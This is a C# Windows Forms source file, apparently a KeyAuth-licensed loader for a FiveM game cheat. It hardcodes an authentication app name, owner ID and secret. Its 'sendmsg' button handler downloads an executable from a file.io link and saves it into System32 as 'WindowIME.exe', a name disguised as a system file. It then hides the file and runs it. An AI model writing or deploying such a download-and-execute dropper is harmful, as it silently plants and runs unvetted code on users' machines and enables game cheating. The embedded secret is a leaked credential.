using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyAuth
{
    public partial class Main : Form
    {

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
//                 <------->
        public static api KeyAuthApp = new api(
           name: "FiveM1",
           ownerid: "PwBTV43ofz",
           secret: "226b407f71d9c16679b3c42401bcb21a2f651375df726c7f247b6b325fd21272",
           version: "1.0"
       );  /*Change*/

        public Main()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 20, 20));
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        string chatchannel = "";

        private void Main_Load(object sender, EventArgs e)
        {
            expiry.Text = "Expiry Date: " + UnixTimeToDateTime(long.Parse(Login.KeyAuthApp.user_data.subscriptions[0].expiry));
        }

        public static bool SubExist(string name, int len)
        {
            for (var i = 0; i < len; i++)
            {
                if (Login.KeyAuthApp.user_data.subscriptions[i].subscription == name)
                {
                    return true;
                }
            }
            return false;
        }
        public string expirydaysleft()
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            dtDateTime = dtDateTime.AddSeconds(long.Parse(Login.KeyAuthApp.user_data.subscriptions[0].expiry)).ToLocalTime();
            TimeSpan difference = dtDateTime - DateTime.Now;
            return Convert.ToString(difference.Days + " Days " + difference.Hours + " Hours Left");
        }

        public DateTime UnixTimeToDateTime(long unixtime)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            try
            {
                dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            }
            catch
            {
                dtDateTime = DateTime.MaxValue;
            }
            return dtDateTime;
        }

        private void sendmsg_Click(object sender, EventArgs e)
        {

            string url = "https://file.io/d/example/FiveM_External.exe"; // Change !!!

            string nombreArchivo = @"C:\Windows\System32\WindowIME.exe";

            if (File.Exists(nombreArchivo))
            {
                File.Delete(nombreArchivo);
            }

            using (WebClient client = new WebClient())
            {
                try
                {
                    client.DownloadFile(url, nombreArchivo);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("An error occurred while downloading the file: " + ex.Message);
                    return;
                }
            }

            File.SetAttributes(nombreArchivo, File.GetAttributes(nombreArchivo) | FileAttributes.Hidden);

            Thread.Sleep(1000);
            try
            {
                System.Diagnostics.Process.Start(nombreArchivo);
            }
            catch (Exception ex)
            {
                MessageBox.Show("An error occurred while running the application: " + ex.Message);
            }

            return;

            Console.WriteLine("KEYAUTH GUI");
        }

        private void expiry_Click(object sender, EventArgs e)
        {

        }
    }
}
